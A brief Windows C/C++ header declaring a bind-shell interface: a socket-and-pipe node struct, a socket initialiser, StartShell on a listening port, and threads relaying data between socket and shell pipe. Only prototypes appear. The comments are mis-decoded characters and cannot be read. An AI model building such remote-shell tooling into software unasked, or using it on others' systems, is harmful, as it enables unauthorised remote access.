#pragma once
#include "stdafx.h"
#include <Windows.h>

// Windows Socket Files:
#include <winsock.h>
#pragma comment(lib, "ws2_32.lib")
/**

����һ��˫�ܵ����������ͺ���

*/
//������������Ϊͨ�Žڵ㣬����socket�͹ܵ�
typedef struct _COMNODE
{
	SOCKET socket;
	HANDLE pipe;


}ComNode,*pComNode;
//���ڳ�ʼ��socket
BOOL SockInit();


/**
//��������shell
port:���ؼ����Ķ˿�

*/

BOOL StartShell(UINT port);

/**
�̺߳���
���ڴ�����ܵ����������
socket->pipe
*/
DWORD WINAPI ThreadInput(LPVOID lppara);

/**
�̺߳���
���ڴ������Թܵ������
pipe->socket
*/
DWORD WINAPI ThreadOutput(LPVOID lppara);
